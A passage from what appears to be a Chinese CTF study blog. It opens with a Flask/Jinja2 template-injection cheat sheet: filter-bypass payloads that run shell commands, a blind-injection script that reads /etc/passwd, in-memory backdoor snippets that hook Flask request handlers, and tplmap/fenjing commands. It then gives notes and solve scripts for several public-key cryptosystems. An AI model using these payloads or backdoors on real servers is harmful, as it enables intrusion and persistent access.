%&#125;&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125; 无回显12345&#123;&#123;yyy.__init__.__globals__.__builtins__|attr(&#x27;__getitem_&#x27;)(&#x27;eval&#x27;)(&#x27;__import__(&quot;time&quot;).sleep(3) if open(&quot;/app/flag.txt&quot;).read()[0]==&quot;f&quot; else 1&#x27;)&#125;&#125;&#123;%if session.update(&#123;&#x27;f&#x27;:lipsum.__globals__.__os__.__popen__(&#x27;id&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;&#123;%include session.update(&#123;&#x27;f&#x27;:lipsum.__globals__.__os__.__popen__(&#x27;id&#x27;).read()&#125;)%&#125; 回显1&#123;%set gl=&#x27;_&#x27;*2+&#x27;globals&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set bu=&#x27;_&#x27;*2+&#x27;builtins&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set im=&#x27;_&#x27;*2+&#x27;i&#x27;&#x27;mport&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set ay=&#x27;so&#x27;[::-1]%&#125;&#123;&#123;cycler.next[gl][bu][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;_&quot;+&quot;_imp&quot;+&quot;ort_&quot;+&quot;_(&#x27;s&quot;+&quot;ys&#x27;).modules[&#x27;_&quot;+&quot;_main_&quot;+&quot;_&#x27;]._&quot;+&quot;_dict_&quot;+&quot;_[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda:&#x27;&lt;pre&gt;&#123;0&#125;&lt;/pre&gt;&#x27;.format(_&quot;+&quot;_impo&quot;+&quot;rt_&quot;+&quot;_(&#x27;o&quot;+&quot;s&#x27;).po&quot;+&quot;pen(&#x27;id&#x27;).read()))&quot;)&#125;&#125; 盲注123456789101112131415161718import requestsfrom string import printable as pthost = &#x27;&#x27;res = &#x27;&#x27;for i in range(0,40): for c in pt: payload = &#x27;&#123;&#123;(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__[&quot;__builtins__&quot;][&quot;file&quot;](&quot;/etc/passwd&quot;).read()|string).index(&quot;%c&quot;,%d,%d)&#125;&#125;&#x27; % (c,i,i+1) param = &#123; &quot;name&quot;:payload &#125; req = requests.get(host,params=param) if req.status_code == 200: res += c break print(res) 长度限制 Flask内置全局函数 通过 globals 属性获取全局空间中的 os 模块，并调用 popen() 函数来执行系统命令。 12&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;&#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125; 保存在 config 全局对象中 config 对象实质上是一个字典的子类，可以像字典一样操作。因此要更新字典，我们可以使用 Python 中字典的 update() 方法。用 update() 方法 + 关键字参数更新字典。 12345678910111213141516171819&#123;%set x=config.update(a=config.update)%&#125;&#123;%set x=config.a(f=lipsum.__globals__)%&#125;&#123;%set x=config.a(o=config.f.os)%&#125; &#123;%set x=config.a(p=config.o.popen)%&#125;&#123;&#123;config.p(&quot;cat /t*&quot;).read()&#125;&#125; &#123;%set x=config.update(l=lipsum)%&#125;&#123;%set x=config.update(g=request.args.a)%&#125;&amp;a=__globals__&#123;%set x=config.update(f=config.l|attr(config.g))%&#125;&#123;%set x=config.update(o=config.f.os)%&#125;&#123;%set x=config.update(p=config.o.popen)%&#125;&#123;%print(config.p(request.args.c).read())%&#125;&amp;c=whoami&#123;&#123;config.update(c=config.update)&#125;&#125;&#123;&#123;config.update(g=&quot;__globals__&quot;)&#125;&#125;&#123;&#123;config.c(f=lipsum[config.g])&#125;&#125;&#123;&#123;config.c(o=config.f.os)&#125;&#125;&#123;&#123;config.c(p=config.o.popen)&#125;&#125;&#123;&#123;config.p(&quot;cat /f*&quot;).read()&#125;&#125; 参考： ImaginaryCTF 2022 - SSTI Golf ImaginaryCTF 2022 - minigolf 内存马123456789101112# beforeeval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read())&quot;)# afterapp.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=make_response(os.popen(request.args.get(\\&#x27;cmd\\&#x27;)).read())&#x27;)==None else resp)cycler.__init__.__globals__.__builtins__[&#x27;exec&#x27;](&quot;request.add_response_callback(lambda request, response: setattr(response, &#x27;text&#x27;, __import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()))&quot;,&#123;&#x27;request&#x27;: request&#125;)# 404页面global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read() ​ 自动化工具Fenjing https://github.com/Marven11/Fenjing python -m fenjing crack --method GET --inputs name --url &#39;http://xxx/&#39; tplmap https://github.com/epinna/tplmap /tplmap.py --os-cmd -u &#39;http://www.target.com/page?name=John&#39; 参考文SSTI模板注入绕过（进阶篇） SSTI漏洞学习 (上)——基础知识和一些不常见的模板引擎介绍 ​ Python格式化字符串漏洞Python 格式化字符串漏洞（Django为例） ​ Bottle框架12&#123;&#123;print(1)&#125;&#125;&#123;&#123;a:=5&#125;&#125;%0a&#123;&#123;print(a)&#125;&#125; ​ Payload参考Server Side Template Injection SSTI (Server Side Template Injection)","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"SSTI","slug":"SSTI","permalink":"https://lazzzaro.github.io/tags/SSTI/"}],"author":"Lazzaro"},{"title":"其他加密算法","slug":"crypto-其他加密算法","date":"2020-05-13T12:21:19.000Z","updated":"2024-06-29T14:41:43.457Z","comments":true,"path":"2020/05/13/crypto-其他加密算法/","permalink":"https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/","excerpt":"","text":"​ GM（Goldwasser-Micali）同态加密Goldwasser-Micali (GM) 加密方案是第一个证明为 CPA 安全的公钥加密方案，其安全性依赖于从合数模的二次非剩余中区分二次剩余困难性假设。 密钥生成 用户随机生成两个大素数 $p$ 和 $q$，计算 $n=pq$，$z$ 是模 $n$ 的二次非剩余中的随机数。系统公钥 $pk=(n,z)$，系统私钥 $sk=(p,q)$。 加密 明文空间是 $\\{0,1\\}$，对于明文 $x\\in\\{0,1\\}$，加密方选取秘密随机数 $r\\in Z_n^{*}$，利用系统公钥 $pk$ 计算密文$E(x)=r^2z^x\\bmod n$。 解密 对于密文 $E(x)$，判断 $E(x)$ 是否为模 $n$ 的二次剩余，若 $E(x)$ 是模 $n$ 的二次剩余，则明文 $D(E(x))=0$； 若 $E(x)$ 不是模 $n$ 的二次剩余，则 $D(E(x))=1$。 GM加密系统的安全性是基于模 $n$ 的二次剩余问题。对于私钥的拥有者，知道大整数 $n$ 的因子分解，求解模 $n$ 的二次剩余问题是容易的；而对于攻击者，无法获知 $n$ 的因子分解，求解模 $n$ 的二次剩余问题是困难的，继而保证了该加密方案的安全性。 123456789101112from Crypto.Util.number import long_to_bytesimport gmpy2plaintext = &#x27;&#x27;with open(&#x27;output.txt&#x27;) as f: n = int(f.readline()) for line in f: cipher = int(line) if gmpy2.jacobi(cipher,n) == -1: plaintext += &#x27;1&#x27; else: plaintext += &#x27;0&#x27; print(long_to_bytes(int(plaintext,2))) ​ ElGamal加密ElGamal加密算法是一个基于迪菲-赫尔曼密钥交换的非对称加密算法。它在1985年由塔希尔·盖莫尔提出。GnuPG和PGP等很多密码学系统中都应用到了ElGamal算法。ElGamal加密算法可以定义在任何循环群G上。它的安全性取决于G上的离散对数难题。 密钥生成 随机选择一个满足安全要求的大素数 $p$，并生成有限域 $Z_{p}$。的一个生成元 $g\\in Z_{p}^{*}$； 选一个随机数 $x\\;(1&lt;x&lt;p-1)$，计算 $y\\equiv g^{x} \\pmod p$，则公钥为 $(y,g,p)$，私钥为 $x$。 加密 与RSA密码体制相同，加密时首先将明文比特串分组，使得每个分组对应的十进制数小于$p$，即分组长度小于$\\log_2p$，然后对每个明文分组分别加密。具体过程分为如下几步： 得到接收方的公钥 $(y,g,p)$； 把消息 $m$ 分组为长度为 $L\\;(L&lt;\\log_2 p)$ 的消息分组 $m=m_1m_2\\dots m_t$； 对第 $i$ 块消息 $(1\\leq i\\leq t)$ 随机选择整数 $r_i\\;(1&lt;r_i&lt;p-1)$； 计算 $c_i\\equiv g^{r_i}\\pmod p,\\;c_i^\\prime\\equiv m_iy^{r_i} \\pmod p\\;(1\\leq i\\leq t)$； 将密文 $C=(c_1,c_1^\\prime)(c_2,c_2^\\prime)\\dots(c_t,c_t^\\prime)$ 发送给接收方。 解密 接收方收到的密文 $C=(c_1,c_1^\\prime)(c_2,c_2^\\prime)\\dots(c_t,c_t^\\prime)$； 使用私钥 $x$ 和解密算法 $m_i \\equiv ({c_i^\\prime}({c_i^x})^{-1}) \\pmod p \\; (1\\leq i\\leq t)$ 进行计算； 得到明文 $m=m_1m_2\\dots m_t$。 ElGamal加密过程需要两次模指数运算和一次模乘积运算，解密过程需要模指数运算，求逆运算和模乘积运算各一次。每次加密运算需要选择一个随机数，所以密文既依赖于明文，又依赖于选择的随机数，故对于同一个明文，不同的时刻生成的密文不同。另外，ElGamal加密使得消息扩展了两倍，即密文的长度是对应明文长度的两倍。 ​ Paillier同态加密Paillier密码，于1999年由Pascal Paillier发明，是一种用于公钥加密的概率非对称算法。该算法具有加法同态的性质；这意味着，仅给出公钥和 $m_1,m_2$ 加密，可以计算出 $m_1 + m_2$ 。 密钥生成 随机选择两个大质数 $p,q$ 满足 $\\gcd(pq,(p-1)(q-1))=1$。此属性保证两个质数长度相等； 计算 $n=pq$ 和 $\\lambda=\\text{lcm}(p-1,q-1)$； 选择随机整数 $g(g\\in \\mathbb{Z}_{n^2}^{*}) $，使得满足 $n$ 整除 $g$ 的阶（$0\\lt g \\lt n^2$）； 定义 $L(x)=\\cfrac{x-1}{n}$； 计算 $\\mu=(L(g^\\lambda \\bmod n^2))^{-1} \\bmod n$； 公钥为 $(n,g)$，私钥为 $(\\lambda,\\mu)$。 简化版 $g=n+1$ $\\lambda=\\varphi(n)=(p-1)(q-1)$ $\\mu=\\varphi(n)^{-1}\\bmod n$ 加密 $m$ 为原文（$0\\leq m \\lt n$）； 选择随机数 $r(0 \\lt r \\lt n,r \\in \\mathbb{Z}_{n^2}^{*})$，且 $\\gcd(r,n)=1$； 加密：$c=g^m \\cdot r^n\\bmod n^2$。 解密 解密：$m=L(c^\\lambda \\bmod n^2)\\cdot \\mu \\bmod n$。 性质 $D(E(m_1,r_1) \\cdot E(m_2,r_2) \\bmod {n^2})=m_1+m_2 \\bmod n$ $D(E(m_1,r_1) \\cdot g^{m_2} \\bmod {n^2})=m_1+m_2 \\bmod n$ $D(E(m_1,r_1)^{m_2} \\bmod {n^2})=m_1m_2 \\bmod n$ $D(E(m_2,r_2)^{m_1} \\bmod {n^2})=m_1m_2 \\bmod n$ $D(E(m,r)^{k} \\bmod {n^2})=km \\bmod n$ $D(E(m,r) \\cdot (1+n)^k \\bmod {n^2})=m+k \\bmod n$ ​ Merkle-Hellman背包加密（Knapsack）1977年，Merkle与Hellman合作设计了使用背包算法，该算法提出后密码学界提出了很多背包型加密算法。 其工作原理是：假定甲想加密，则先产生一个较易求解的背包问题，并用它的解作为专用密钥；然后从这个问题出发，生成另一个难解的背包问题，并作为公共密钥。如果乙想向甲发送报文，乙就可以使用难解的背包问题对报文进行加密，由于这个问题十分难解，所以一般没有人能够破译密文；甲收到密文后，可以使用易解的专用密钥解密。 但是，在它发表几年后，就找到了攻破它的方法。即使如此，它仍然代表着一类很难问题的算法。 加密 选择任何一个超递增集 $\\{s_1,s_2,…,s_n\\}$。 陷门由任意大于 $\\sum_{i}s_i$ 的素数 $p$ 和任意小于 $p$ 的整数 $a$ 组成，这两个数和集合 $\\{s_1,s_2,…,s_n\\}$ 都是保密的。 公开的整数集是 $\\{t_1,t_2,…,t_n\\}$ ，其中 $t_i=a_i \\cdot s_i \\pmod p$。 二进制明文 $(b_1,b_2,…,b_n)$ 的加密操作为 $y=\\sum_{i}b_it_i$，整数 $y$ 是密文。 解密 找到 $a^{-1} \\pmod p$。因为 $p$ 是质数， $a^{-1} \\pmod p$ 一定存在。计算 $a^{-1}y \\pmod p$。 得到 $a^{-1}y \\pmod p$ 这使得： $a^{-1}y=a^{-1}\\sum_{i}b_it_i \\pmod p=\\sum_{i}b_i(a^{-1}as_i) \\pmod p=\\sum_{i}b_is_i$ 因为集合 $\\{s_1,s_2,…,s_n\\}$是超递增集，所以很容易定位明文位。 ★注： Knapsack系统的密度为： $d = \\cfrac{n}{\\log_2(max\\{a_i\\})}$ 基于子集和问题，MH密码系统是最开始出现的一种密度比较低的Knapsack密码系统。很快Shamir等人提出了一系列的攻击方式，包括丢番图逼近，LLL等方法（$d&lt;0.9408$）。虽然这个密码系统被攻破了，新的Knapsack系统诞生了，这种密码系统的密度变高了，$a_i$ 值变小了，而且加密的明文的二进制位中1的数量也很小。 新的密码系统更加难以破解，也称之为HardKnapsack系统，不过后来密码学家们还是发现了攻击方法，我们称之为low-weight attack。 Schroeppel-Shamir Algorithm 时间复杂度,空间复杂度均为 $O(\\cfrac{n}{2})$ The Howgrave-Graham–Joux Algorithm 时间复杂度 $O(0.337n)$，空间复杂度 $O(0.256n)$ 总体来说，这两种算法是基于分治和mitm的思想进行攻击的。 Lagarias and Odlyzko’s Method / CJLOSS Method 参考：Lattice Reduction Attack on the Knapsack Type Cryptosystem 构造格： $\\left(\\begin {array}{c} b_0 \\newline b_1 \\newline \\vdots \\newline b_n \\newline b_{n+1} \\end{array} \\right) =\\left(\\begin {array}{c} 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_0 \\newline 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; Nk_1 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; Nk_n \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_{n+1} \\end{array} \\right) $ 12345678910111213141516M = Matrix.identity(n)last_row = [0 for x in keys]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)ct = last_col = keys[:]last_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.LLL()target = X[0][:-1]ans = [-k for k in target] 对于密度比较高的Knapsack密码系统，在1的数量确定情况下，可以尝试分段爆破。 参考论文：Improved Generic Algorithms for Hard Knapsacks 常规解密脚本 12345678910111213141516171819202122232425262728293031323334353637383940from sage.all import *pk = # public keyct = # ciphertextprint(ct)print(len(pk))n = len(pk)# Sanity check for application of low density attackd = n / log(max(pk), 2)print(CDF(d))assert CDF(d) &lt; 0.9408M = Matrix.identity(n) * 2last_row = [1 for x in pk]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)last_col = pklast_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.BKZ()sol = []for i in range(n + 1): testrow = X.row(i).list()[:-1] if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) breaks = solprint(s) 泄露部分明文空间的降维处理 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758###Sagepubkey = [...] c = #前缀 flag&#123;prefix = [int(_) for _ in bin(bytes_to_long(b&#x27;flag&#123;&#x27;))[2:]]for i in range(len(prefix)): c -= prefix[i] * pubkey[i]#后缀 &#125;suffix = [int(_) for _ in bin(ord(&#x27;&#125;&#x27;))[2:].rjust(8, &#x27;0&#x27;)]n = len(pubkey)for i in range(8): c -= pubkey[n - 8 + i] * suffix[i]#中部md5范围 0-felements = []for i in range(len(prefix), len(pubkey) - 8, 8): elements.append(pubkey[i + 1]) c -= 1 * pubkey[i + 2] for j in range(3, 8): elements.append(pubkey[i + j]) n = len(elements)A = Matrix(ZZ, n + 1, n + 1)for i in range(n): A[i, 0] = elements[i] A[i, i + 1] = 2A[n, 0] = cfor i in range(1, n + 1): A[n, i] = 1AL = A.BKZ()mid = Nonefor line in AL: if all(line[i] == 1 or line[i] == -1 for i in range(1, n + 1)): if line[1] == 1: line = -line mid = line[1:] breakmid_str = &#x27;&#x27;for _ in mid: if _ == -1: mid_str += &#x27;0&#x27; else: mid_str += &#x27;1&#x27;flag = &#x27;&#x27;j = 0for i in range(32): flag += &#x27;0&#x27; flag += mid_str[j] j += 1 flag += &#x27;1&#x27; for k in range(5): flag += mid_str[j] j += 1print(bytes.fromhex(hex(int(flag, 2))[2:])) 子集合问题 转化为 求解SVP/CVP+Lattice Reduction Algorithm 参考： WMCTF 2020 - babySum + Sum Crypto Research: Solving Subset Sum Problem by Lattice Reduction 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import reimport randomimport multiprocessing as mpfrom functools import partialdef check(sol, A, s): &quot;&quot;&quot;Check whether *sol* is a solution to the subset-sum problem. &quot;&quot;&quot; return sum(x*a for x, a in zip(sol, A)) == s def solve(A, n, k, s, ID=None, BS=22): N = ceil(sqrt(n)) # parameter used in the construction of lattice rand = random.Random(x=ID) # seed # 1. Construct the lattice # (n+1) * (n+2) # 1 0 ... 0 a_0*N N # 0 1 ... 0 a_1*N N # . . ... . ... . # 0 0 ... 1 a_n*N N # 0 0 ... 0 s*N k*N lat = [] for i, a in enumerate(A): lat.append([1*(j == i) for j in range(n)] + [N*a] + [N]) lat.append([0]*n + [N*s] + [k*N]) # main loop itr = 0 start_time = cputime() while True: itr += 1 # 2. Randomly shuffle l = lat[::] shuffle(l, random=rand.random) # 3. BKZ!!! m = matrix(ZZ, l) t_BKZ = cputime() m_BKZ = m.BKZ(block_size=BS) print(f&quot;n=&#123;n&#125; &#123;itr&#125; runs. BKZ running time: &#123;cputime(t_BKZ):.3f&#125;s&quot;) # 4. Check the result for i, row in enumerate(m_BKZ): if check(row, A, s): if row.norm()^2 == k: print(f&quot;n=&#123;n&#125; After &#123;itr&#125; runs. FIND SVP!!! &#123;row&#125;\\n&quot; f&quot;Single core time used: &#123;cputime(start_time):.3f&#125;s&quot;) return Trues = A = []#choose k numbers from nk = n = solve_n = partial(solve, A, n, k, s)CPU_CORE_NUM = 8with mp.Pool(CPU_CORE_NUM) as pool: reslist = pool.imap_unordered(solve_n, range(CPU_CORE_NUM)) # terminate all processes once one process returns for res in reslist: if res: pool.terminate() break ​ Benaloh加密 密钥生成 假定块大小为 $r$，每个明文信息块大小在 $[0,r)$ 范围内。 选择两个大质数 $p=rp’+1$ 和 $q$ ，满足 $\\gcd(p’,r)=\\gcd(q-1,r)=1$； 计算 $n=pq$ 及 $\\varphi(n)=(p-1)(q-1)$； 选择 $0 \\leq y \\lt n$，满足 $y^{\\varphi(n)/r} \\not\\equiv 1 \\pmod n$； 计算 $x=y^{\\varphi(n)/r} \\bmod n$，公钥为 $(y,n)$，私钥为 $(\\varphi,x)$。 加密 假设要加密的信息 $m \\in [0,r)$： 选择一个数 $u \\in [0,n)$； 计算 $c=y^mu^r \\bmod n$ 即为 $m$ 的密文。 解密 假设要解密的信息 $c$： 计算 $a=c^{\\varphi(n)/r} \\bmod n$； DLP求解满足 $x^m \\equiv a \\pmod n$ 的 $m$，即 $m=\\log_x(a)$。 参考 https://mystiz.hk/posts/2021-02-15-dicectf-1/ 123456789101112131415161718192021222324252627282930from Crypto.Util.number import long_to_bytesfrom tqdm import tqdmn = y = e = C = []p = q = phi = (p-1) * (q-1)tmp = phi // ebounds = (1, e)F = IntegerModRing(n)result = []x = F(pow(y, tmp, n))for c in tqdm(C): a = F(pow(c, tmp, n)) result.append(bsgs(x, a, bounds))flag = 0for i in result[::-1]: flag = flag*e + iflag = long_to_bytes(flag)print(flag) ​ LUC-RSA加密 Lucas数列（卢卡斯数列） 递推关系 给定两个整数 $P$ 和 $Q$，满足：$P^2-4Q \\ne 0$， 第一类卢卡斯数列 $U_n(P,Q)$ 定义： $U_0(P,Q)=0 \\\\ U_1(P,Q)=1 \\\\ U_n(P,Q)=P \\cdot U_{n-1}(P,Q) - Q \\cdot U_{n-2}(P,Q), n&gt;1$ 第二类卢卡斯数列 $V_n(P,Q)$ 定义： $V_0(P,Q)=2 \\\\ V_1(P,Q)=P \\\\ V_n(P,Q)=P \\cdot V_{n-1}(P,Q) - Q \\cdot V_{n-2}(P,Q), n&gt;1$ 代数关系 特征方程：$x^2-Px+Q=0$，判别式：$D=P^2-4Q$，根：$a=\\cfrac{P+\\sqrt{D}}{2},b=\\cfrac{P-\\sqrt{D}}{2}$。 卢卡斯数列的项可用 $a$ 和 $b$ 的项定义： $U_n = \\cfrac{a^n-b^n}{a-b} = \\cfrac{a^n-b^n}{\\sqrt{D}}$ $V_n = a^n + b^n$ 密钥生成 设 $p,q$ 是两个奇素数，$N=pq$。 $e \\in \\mathbb{Z}_N$，且 $\\gcd(e,(p-1)(p+1)(q-1)(q-1))=1$。 卢卡斯数列 $V_n(M,1) = M \\cdot V_{n-1} - V_{n-2}$，即 $P=M,Q=1$。（更一般情况见paper） 公钥为：$(N,e)$。 加密 $C=V_e(M,1) \\pmod N$，对任意信息 $M \\in \\mathbb{Z}_N$。 解密 解密密钥 $d$，$ed \\equiv 1 \\pmod {S(N)}$， $S(N)=\\text{lcm}\\left(p-\\left (\\cfrac{D}{p} \\right),p-\\left (\\cfrac{D}{q} \\right)\\right)$，$D=C^2-4$， 其中 $\\left(\\cfrac{D}{p} \\right)= \\begin{cases} 1,&amp; \\exists x, x^2 \\equiv D \\pmod {p} \\\\ 0,&amp; p \\mid D \\\\ -1, &amp; \\text{other} \\end{cases}$ 为勒让德(Legendre)符号。 $M=V_d(C,1) \\pmod N$。 参考 一种新的基于 Lucas 序列的公钥密码体制 LUC: A New Public Key System UMassCTF 2021 - Weird RSA LUC-RSA: A new attack on three variants of the RSA cryptosystemCryptanalysis of RSA-type cryptosystems based on Lucas sequences, Gaussian integers and elliptic curves HFCTF 2022 - RRSSAA RCTF 2022 - easyRSA 1234567891011121314151617181920212223242526272829303132333435363738394041#法1，快速矩阵幂from Crypto.Util.number import long_to_bytesN=C=def ffm(num): # Fermat&#x27;s Factorization Method. if num%2==0: return (2,num/2) a=ceil(sqrt(num)) c=a**2-num while is_square(c)==0: a+=1 b=sqrt(c) return (a-b,a+b)def matpow(mat,power): # Matrix Square-And-Multiply Exponentiation. power_rep=bin(power)[3:] result=mat pcnt=1 for i in power_rep: result=result*result pcnt*=2 if i==&#x27;1&#x27;: result=mat*result pcnt+=1 print(pcnt) return resultdef decrypt(d): # Decryption. Mat=Matrix(Zmod(N),[[C,-1],[1,0]]) ori=vector(Zmod(N),[C,2]) return matpow(Mat,d-1)*orip,q=ffm(N) assert p*q==ND=(C**2-4)%Np_leg,q_leg=int((p-kronecker(D,p))%N),int((q-kronecker(D,q))%N)tn=lcm((p_leg),(q_leg))d=inverse_mod(0x10001,tn)assert (0x10001*d)%tn==1decc,_=decrypt(d)print(long_to_bytes(decc)) 1234567891011#法2，存储vd#vd(2n)=vd(n)^2-2#vd(2n+1)=c*vd(n)^2-vd(n)*vd(n-1)+cdef v(n): if n == 0: return 2 if n == 1: return c if n in v_dict.keys(): return v_dict[n] if(n % 2 == 0): ret = (pow(v(n // 2), 2, N) - 2) % N else: ret = (c * pow(v(n // 2), 2, N) - v(n // 2) * v((n // 2) - 1) - c) % N v_dict[n] = ret return ret 12345678910111213#法3，William&#x27;s p+1算法优化vd# Williams&#x27;s p + 1 algorithmdef LUC(c, d, N): x = c y = (c**2 - 2) % N for bit in bin(d)[3:]: if bit == &#x27;1&#x27;: x = (x*y - c) % N y = (y**2 - 2) % N else: y = (x*y - c) % N x = (x**2 - 2) % N return x ​ DSA数字签名 密钥生成 选择一个合适的哈希函数，目前一般选择SHA1，也可以选择强度更高的哈希函数 $H$； 选择密钥的长度 $L$ 和 $N$，这两个值决定了签名的安全程度。在最初的DSS（Digital Signature Standard ）中建议 $L$ 必须为64的倍数，并且 $512≤L≤1024$，当然也可以更大。$N$ 大小必须不大于哈希函数 $H$ 输出的长度。FIPS 186-3给出了一些建议的 $L$ 和 $N$ 的取值例子：$(1024, 160),(2048, 224), (2048, 256),(3072, 256)$。 选择 $N$ 比特的素数 $q$； 选择 $L$ 比特的素数 $p$，使得 $p-1$ 是 $q$ 的倍数； 选择满足 $g^k \\equiv 1 \\pmod p$ 的最小正整数 $k$ 为 $q$ 的 $g$，即在模 $p$ 的背景下，$\\mathrm{ord}(g)=q$ 的 $g$。即 $g$ 在模 $p$ 的意义下，其指数次幂可以生成具有 $q$ 个元素的子群。这里可以通过计算 $g \\equiv h^{\\frac{p−1}{q}} \\pmod p$ 来得到 $g$，其中 $h \\in (1,p−1)$ 。 选择私钥 $x \\in (0,q)$，计算 $y \\equiv g^x \\pmod p$。 公钥为 $(p,q,g,y)$，私钥为 $(x)$。 签名 选择随机整数数 $k \\in (0,q)$ 作为临时密钥； 计算 $r \\equiv (g^k \\bmod p) \\pmod q$； 计算 $s \\equiv (H(m)+xr)k^{-1} \\pmod q$。 签名结果为 $(r,s)$。需要注意的是，这里使用了哈希函数对消息进行了哈希处理。 验证 计算辅助值 $w \\equiv s^{-1} \\pmod q$； 计算辅助值 $u_1 \\equiv H(m)\\cdot w \\pmod q$； 计算辅助值 $u_2 \\equiv r\\cdot w \\pmod q$； 计算 $v \\equiv (g^{u_1}y^{u_2} \\bmod p) \\pmod q$； 如果 $v$ 与 $r$ 相等，则校验成功。 攻击 $k$ 复用（共享 $k$） 如果在两次签名的过程中共享了 $k$，就可以进行攻击。 假设签名的消息为 $m_1,m_2$，显然两者的 $r$ 的值一样，此外 $s_1 \\equiv (H(m_1)+xr)k^{-1} \\pmod q$ $s_2 \\equiv (H(m_2)+xr)k^{-1} \\pmod q$ 这里除了 $x$ 和 $k$ 不知道剩下的均知道，联立有 $k(s_1-s_2) \\equiv (H(m_1)-H(m_2)) \\pmod q$， 此时即可解出 $k$，进一步可以解出 $x$。 $k$ 部分泄露 参考：Recovering cryptographic keys from partial information, by example ​ Elgamal数字签名 密钥生成 选取一个足够大的素数 $p$（十进制位数不低于160），便于在 $\\mathbb{Z}_p$ 上求解DLP是困难的； 选取生成元 $g \\in (0,p)$； 随机选取整数 $d \\in [0,p-2]$，并计算 $g^d \\equiv y \\pmod p$； 公钥为 $(p,g,y)$，私钥为 $(d)$。 签名 A选取随机数 $k \\in (0,p-1)$，且 $\\gcd(k,p-1)=1$，对消息进行签名： $\\mathrm{sig}(m,k)=(r,s)$ 其中： $r \\equiv g^k \\pmod p$ $s \\equiv (m-dr)k^{-1} \\pmod {p-1}$。 验证 如果 $g^m \\equiv y^rr^s \\pmod p$，那么验证成功，否则验证失败。 攻击 $k$ 复用（共享 $k$） 如果签名者复用了随机数 $k$ ，那么攻击者就可以轻而易举地计算出私钥。 假设目前有两个签名都是使用同一个随机数进行签名的。那么有： $r \\equiv g^k \\pmod p$ $s_1 \\equiv (m_1-dr)k^{-1} \\pmod {p-1}$ $s_2 \\equiv (m_2-dr)k^{-1} \\pmod {p-1}$, 进而有 $k(s_1-s_2) \\equiv (m_1-m_2) \\pmod {p-1}$， $s_1,s_2,m_1,m_2,p$ 均已知，容易算出 $k$，进而根据 $s$ 的计算方法得到私钥 $d \\equiv (m-ks)r^{-1} \\pmod {p-1}$。 构造验证 单参数 选择 $e \\in (1,p-1)$，令 $r=g^ey \\bmod p$，$s=-r \\bmod (p-1)$，有 $m=es \\bmod (p-1)$ 满足验证。 双参数 选择 $e,v \\in (1,p-1),\\gcd(v,p-1)=1$，令 $r=g^ey^v \\bmod p$，$s=-rv^{-1} \\bmod (p-1)$，有 $m=es \\bmod (p-1)$ 满足验证。 ​ Shamir密钥分享算法Shamir 密钥分享算法最早是由 Shamir 和 Blackly 在 1970 年基于 Lagrange 插值和矢量方法提出的。 算法有 2 个重要参数：$k$ 和 $n$。$n$ 表示将明文加密为 $n$ 个 $\\text{Shadow}$，$k$ 表示 至少需要 $k$ 个 $\\text{Shadow}$ 才可以恢复出明文。 加密 若明文为 $s$，$s \\in \\mathbb{Z}_p$，$p$ 为一个大素数。在 $\\text{GF}(p)$ 任取 $k-1$ 个随机数： $a_1,a_2,\\cdots,a_{k-1}$，构造如下多项式： $f(x)=s+a_1x+a_2x^2+\\cdots+a_{k-1}x^{k-1} \\pmod p$ 任取 $n$ 个不同的数：$x_1,x_2,\\cdots,x_n$，分别代入多项式得到 $n$ 个密钥对： $(x_1,f(x_1)),(x_2,f(x_2)),\\cdots,(x_n,f(x_n))$ 将这 $n$ 个密钥对分发给 $n$ 个持有者。 解密 得到了 $n$ 个密钥对 $(x_1,f(x_1)),(x_2,f(x_2)),\\cdots,(x_n,f(x_n))$ 后，可以列出以下在 $\\text{GF}(p)$ 上的方程组： $\\left\\{\\begin{array}{c} s+a_1x_1+a_2x_1^2+\\cdots+a_{k-1}x_1^{k-1}=f(x_1) \\\\ s+a_1x_2+a_2x_2^2+\\cdots+a_{k-1}x_2^{k-1}=f(x_2) \\\\ \\vdots \\\\ s+a_1x_n+a_2x_n^2+\\cdots+a_{k-1}x_n^{k-1}=f(x_n) \\end{array}\\right.$ 然后就可用 Lagrange 插值算法求出 $s$ 了。 12345#python-1from sslib import shamirdata = &#123;&#x27;required_shares&#x27;: 2, &#x27;prime_mod&#x27;: 